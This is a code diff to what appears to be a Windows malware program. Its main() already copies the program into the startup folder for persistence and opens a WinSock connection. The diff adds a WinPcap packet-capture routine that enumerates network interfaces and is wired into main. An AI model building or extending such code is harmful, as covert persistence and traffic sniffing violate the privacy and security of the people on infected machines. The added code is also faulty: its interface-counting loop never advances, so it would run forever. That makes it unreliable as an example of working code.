@@ -9,6 +9,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <vector>
+#include <pcap.h>
 
 //specify WinSock lib or else symbols will not match
 #pragma comment(lib,"ws2_32.lib") //WinSock lib
@@ -203,6 +204,46 @@ int startup_finder() {
 	return 0;
 }
 
+
+/*
+ *This function will find the size of lists created by functions in wpdpack libs
+ *list: should be the first point of a pcap interface list
+ *returns: the size of the list parameter
+ */
+int size_of_list(pcap_if_t*  list) {
+	int size = 0;
+
+	//loops until d is NULL and counts elements
+	for (pcap_if_t* d = list; d; d->next) {
+		std::cout << d->name << std::endl;
+		size++;
+	}
+
+	return size;
+}
+
+/*
+ *This function will take care of packet capture using winpcap library
+ *returns: 0 if successful otherwise returns -1
+ */
+int capture_em_packets() {
+	/////////////////////Remember to install the winpcap.dll/////////////////
+	pcap_if_t* all_devices;	//first point of interface list
+	char error_msg[PCAP_ERRBUF_SIZE]; //error message buffer
+
+	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &all_devices, error_msg) == -1) {
+		return -1;
+	}
+	
+	if (size_of_list(all_devices) == 0) {
+		return -1;
+	}
+
+	//select interface
+	/////////////////////////////////////////////////////////////////////////
+	return 0;
+}
+
 /*
  *
  */
@@ -210,6 +251,9 @@ int main()
 {
 	//Implements persistence by copying itself to startup folder
 	startup_finder();
+
+	//capture packets
+	capture_em_packets();
 
 	//Initialize Socket
 	WSAData version; //We need to check the version
